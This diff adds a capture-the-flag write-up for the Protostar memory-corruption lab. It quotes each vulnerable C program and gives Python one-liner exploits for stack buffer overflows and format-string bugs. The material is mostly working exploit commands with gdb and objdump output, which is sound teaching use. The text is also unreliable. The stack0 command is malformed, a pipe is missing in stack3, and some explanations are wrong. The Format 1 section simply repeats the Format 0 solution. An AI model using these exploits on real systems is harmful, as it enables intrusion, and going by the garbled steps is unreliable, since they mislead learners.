@@ -1,0 +1,257 @@
+*CTF Protostar solutions*narrative
+Protostar
+    Memory corruption exercises, to be carried out in a VM that you can get at https://exploit-exercises.com/download.
+
+    The box credentials are:
+    *user:user, root:godmode*
+
+Exercise 0
+        The code for is exercise is:
+    *volatile int modified;
+    char buffer[64];
+    int modified = 0;
+    gets(buffer);
+    if (modified != 0) {
+        printf("you have changed the 'modified' variable\n");
+    } else {
+        printf("Try again?\n");
+    }*
+
+    The objective is to modify the 'modified' integer local variable to non-zero value.
+
+    gets() will copy user-supplied data from the standard input into the char array buffer, and it will write past to it if the size of the data is greater than the size of the array, overriding the value of the next element in the stack, in this case the modified target variable.
+
+    We can easily achieve it with:
+
+    *$ python -c "print 'x' * '>65" | ./stack0*
+
+Exercise 1
+    *volatile int modified;
+    char buffer[64];
+
+    if (argc == 1) {
+        errx(1, "please specify an argument\n");
+    }
+
+    modified = 0;
+    strcpy(buffer, argv[1]);
+
+    if (modified == 0x61626364) {
+        printf("you have correctly got the variable to the right value\n");
+    } else {
+        printf("Try again, you got 0x%08x\n", modified);
+    }*
+
+    We need to change the address of the return function to 0x61626364.
+
+    The memory location is represented in hexadecimal, and the stack is little endian. Therefore, we need to hex decode the value and reverse it.
+
+    The following python code will do this for us:
+
+    *$ ./stack1 $(python -c "print 'x' * 64 +'61626364'.decode('hex')[::-1]")*
+
+Exercise 2
+    The code the exercise is the following:
+
+    *#include &lt;stdlib.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;stdio.h&gt;
+    #include &lt;string.h&gt;
+
+    int main(int argc, char **argv)
+    {
+        volatile int modified;
+        char buffer[64];
+        char *variable;
+        variable = getenv("GREENIE");
+        if (variable == NULL) {
+         errx(1, "please set the GREENIE environment variable\n");
+    }
+
+    modified = 0;
+
+    strcpy(buffer, variable);
+
+    if (modified == 0x0d0a0d0a) {
+        printf("you have correctly modified the variable\n");
+    } else {
+        printf("Try again, you got 0x%08x\n", modified);
+    }
+    }*
+
+    This exercise is very similar to the previous one, but we have one more level of indirection.
+
+    Rather than reading the user-controllable data from input stream, it is read from an environment variable.
+
+     We can use the previous exploit to set the GREENIE environment variable to 0x0d0a0d0a.
+
+    *$ export GREENIE=$(python -c "print 'x'* 64 + '0d0a0d0a'.decode('hex')[::-1]"); ./stack2*
+
+Exercise 3
+
+    *void win()
+    {
+        printf("code flow successfully changed\n");
+    }
+
+    int main(int argc, char **argv)
+    {
+        volatile int (*fp)();
+        char buffer[64];
+
+        fp = 0;
+
+        gets(buffer);
+
+        if (fp) {
+            printf("calling function pointer, jumping to 0x%08x\n", fp);
+            fp();
+        }
+    }*
+
+    The objective of the challenge is to have function win() executed. We can achieve it by making pointer fp referencing it.
+
+    First, we need to see where the definition of win() is in memory. We can find the assembly of the binary by running:
+
+    *$ objdump -d stack3*
+
+    win() is in memory position 0x08048424.
+
+    To trick the program into executing win(), we have to overflow the gets() function call and override the fp pointer.
+
+    Since the stack is little endian, we have to reverse the digits and add 64 padding bytes.
+
+
+    *$ python -c "print 'x' * 64 + '08048424'.decode('hex')[::-1]" ./stack3*
+
+
+Exercise 4
+
+    The code for this exercise is the following:
+
+    *#include &lt;stdlib.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;stdio.h&gt;
+    #include &lt;string.h&gt;
+
+    void win() {
+        printf("code flow successfully changed\n");
+    }
+
+    int main(int argc, char **argv)
+    {
+        char buffer[64];
+
+        gets(buffer);
+    }*
+
+    The objective, as in the previous examples is to get win() executed by overflowing buffer and overwritting the stack pointer ESP.
+
+    First we need to find out where win() is in memory:
+
+    *$ objdump -d /opt/protos/bin/stack4 | grep win
+            080483f4 &lt;win&gt;:*
+
+   So we know win() is in memory position 080483f4. We still don't know how much padding we have to add. We can find out how much.
+
+
+    *(gdb) disas main
+    8048408: 55              push %ebp
+    8048409: 89 e5           mov %esp,%ebp
+    804840b: 83 e4 f0        and $0xfffffff0,%esp
+    804840e: 83 ec 50        sub $0x50,%esp
+    8048411: 8d 44 24 10     lea 0x10(%esp),%eax
+    8048415: 89 04 24        mov %eax,(%esp)
+    8048418: e8 ef fe ff ff  call 804830c &lt;gets@plt&gt;
+    804841d: c9              leave
+    804841e: c3              ret
+    804841f: 90              nop*
+
+    We can see in 0x804840e that the program is allocating x50 bytes for the array, 80 in decimal.
+
+    We have to subtract 4 bytes for the EBP and RET, which makes 76.
+
+    *$ python -c "print 'x'* 76 + '080483f4'.decode('hex')[::-1]" | /opt/protostar/bin/stack4
+            code flow successfully changed
+            Segmentation fault*
+
+Format 0
+
+    The code for this exercise is the following:
+
+    *#include &lt;stdlib.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;stdio.h&gt;
+    #include &lt;string.h&gt;
+
+    void vuln(char *string)
+    {
+        volatile int target;
+        char buffer[64];
+
+        target = 0;
+
+        sprintf(buffer, string);
+
+        if (target == 0xdeadbeef) {
+            printf("you have hit the target correctly :)\n");
+        }
+    }
+
+    int main(int argc, char **argv)
+    {
+        vuln(argv[1]);
+    }*
+
+    sprintf copies our user-supplied data to the buffer char array, which happens to be under the target int variable in the stack. Sprintf is vulnerable to format string.
+
+   *$/opt/protostar/bin/format0 $(python -c "print 'x'*64 + 'deadbeef'.decode('hex')[::-1]")
+        you have hit the target correctly :)*
+
+   The gotcha is that we need to exploit it with 10 bytes or less.
+
+    We can take advantage of the format string to add 64 padding 0 using %64s as follows:
+
+    *$/opt/protostar/bin/format0 $(python -c "print '%64s' + 'deadbeef'.decode('hex')[::-1]")
+            you have hit the target correctly :)*
+
+Format 1
+
+    The code for this exercise is the following:
+
+    *#include &lt;stdlib.h&gt;
+    #include  &lt;unistd.h&gt;
+    #include  &lt;stdio.h&gt;
+    #include  &lt;string.h&gt;
+
+    int target;
+
+    void vuln(char *string)
+    {
+        printf(string);
+
+        if(target) {
+            printf("you have modified the target :)\n");
+        }
+    }
+
+    int main(int argc, char **argv)
+    {
+        vuln(argv[1]);
+    }*
+
+    The vulnerable function in the previous example is printf().
+
+    We can see it only contains one text argument in the function call, therefore we have control over the format parameter.
+
+    If we pass more format parameters than variable pairs the program will start poping elements from the stack.
+
+    *$/opt/protostar/bin/format0 $(python -c "print 'x'*64 + 'deadbeef'.decode('hex')[::-1]")
+        you have hit the target correctly :)*
+
+    The gotcha is that we need to exploit it with 10 bytes or less.
+
+    We can take advantage of the format string to add 64 padding 0 using %64s as follows:
+
+    *$/opt/protostar/bin/format0 $(python -c "print '%64s' + 'deadbeef'.decode('hex')[::-1]")
+        you have hit the target correctly :)*
